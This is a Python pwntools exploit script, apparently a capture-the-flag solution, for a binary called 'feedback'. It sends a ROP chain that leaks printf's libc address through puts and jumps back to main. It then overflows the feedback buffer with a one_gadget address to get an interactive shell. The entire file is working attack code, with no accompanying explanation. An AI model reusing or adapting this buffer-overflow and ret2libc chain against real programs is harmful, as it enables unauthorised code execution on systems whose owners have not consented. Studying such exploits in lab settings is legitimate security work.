import os
from pwn import *

exe = ELF('./feedback')
libc = ELF('./libc-2.31.so')
#context.log_level = 'debug'

def AddPad(payload):
	return b'Z'*(80 - len(payload))

p = process('./feedback_patched')

### Stage 1: Leak address + Jump to beginning #########################
ret = 0x40101a
pop_rdi_ret = 0x4015d3
printf_got = exe.got['printf']
puts_plt = exe.plt['puts']
main_func_addr = 0x000000000040145c
printf_offset = libc.symbols['printf']
one_gadget_offset = 0xe6c81

payload1 = p64(ret)*3
payload1 += p64(pop_rdi_ret)
payload1 += p64(printf_got)
payload1 += p64(puts_plt)
payload1 += p64(main_func_addr)
payload1 += AddPad(payload1)

p.recvuntil(b'Your name: ')
p.sendline(b'MyName')
p.recvuntil(b'You choice: ')
p.sendline(b'4')
p.recvuntil(b'Your feedback:')
p.sendline(payload1)

# Check if program jump back to begin of main or not by verifying leak address
try:
	printf_addr = u64(p.recvline()[1:-1] + b'\x00'*2)
except:
	print('Something happened!')
	exit(-1)

libc_base = printf_addr - printf_offset
one_gadget_addr = libc_base + one_gadget_offset
print('[+] Printf address leak:', hex(printf_addr))
print('[*] Libc base:', hex(libc_base))
print('[*] One gadget addr:', hex(one_gadget_addr))

### Stage 2: input one gadget #########################################
payload2 = b'A'*72
payload2 += p64(one_gadget_addr)

p.recvuntil(b'You choice')
p.sendline(b'4')
p.recvuntil(b'Your feedback:')
p.sendline(payload2)

p.interactive()
